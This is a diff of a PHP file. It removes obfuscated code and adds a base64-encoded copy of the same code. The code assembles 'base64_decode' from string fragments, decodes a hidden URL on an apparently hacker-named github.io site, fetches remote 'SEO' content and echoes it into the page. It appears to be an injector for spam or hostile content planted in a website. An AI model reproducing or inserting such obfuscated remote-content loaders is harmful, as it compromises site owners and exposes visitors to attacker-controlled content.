@@ -1,6 +1,1 @@
-<?php 
-$baseeeeeeeeeeeee = 'ba'.'se'. 128/2 .'_' .'de'.'co'.'de';
-$variablee = file_get_contents($baseeeeeeeeeeeee("aHR0cHM6Ly9oNGNrbGlua2VyLmdpdGh1Yi5pby9zZW8vc2VvLnR4dA=="));
-$metin = iconv('UTF-8','UTF-8',$variablee);
-echo $metin;
-?>
+PD9waHAgCiRiYXNlZWVlZWVlZWVlZWVlID0gJ2JhJy4nc2UnLiAxMjgvMiAuJ18nIC4nZGUnLidjbycuJ2RlJzsKJHZhcmlhYmxlZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRiYXNlZWVlZWVlZWVlZWVlKCJhSFIwY0hNNkx5OW9OR05yYkdsdWEyVnlMbWRwZEdoMVlpNXBieTl6Wlc4dmMyVnZMblI0ZEE9PSIpKTsKJG1ldGluID0gaWNvbnYoJ1VURi04JywnVVRGLTgnLCR2YXJpYWJsZWUpOwplY2hvICRtZXRpbjsKPz4=
